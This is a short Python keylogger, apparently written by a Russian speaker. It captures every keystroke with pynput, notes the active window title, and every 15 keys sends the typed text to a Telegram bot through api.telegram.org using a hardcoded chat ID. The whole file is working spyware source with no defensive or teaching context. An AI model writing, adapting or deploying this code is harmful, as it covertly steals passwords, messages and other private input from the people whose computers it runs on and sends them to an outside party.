import pynput
from pynput.keyboard import Key, Listener
import requests
from win32gui import GetWindowText, GetForegroundWindow

bot_token = 'Токен бота'

class BasProject:
    def __init__(self):
        self.count = 0
        self.keys = []

    def onpress(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count == 15:
            send_text = ''
            for sym in self.keys:
                if str(sym) == 'Key.space':
                    sym = str(sym).replace('Key.space', ' ')

                elif str(sym) == 'Key.enter':
                    sym = str(sym).replace('Key.enter', '<Enter>')

                elif str(sym) == 'Key.cmd':
                    sym = str(sym).replace('Key.cmd', '<Возможно был изменён язык, ввода>')
                elif 'Key' in str(sym):
                    sym = ''
                sym = str(sym).replace("'", "")

                send_text += sym

            active_window = GetWindowText(GetForegroundWindow())

            data = {'chat_id':944058875, 'text':f'{send_text}\n'
                                                 f'Активное окно - <b>{active_window}</b>', 'parse_mode':'html'}

            requests.post(url="https://api.telegram.org/bot" + bot_token + "/sendMessage", data=data)

            self.keys = []
            self.count = 0

if __name__ == 'BasProject':
    obj = BasProject()
    with Listener(on_press = obj.onpress) as listener:
        listener.join()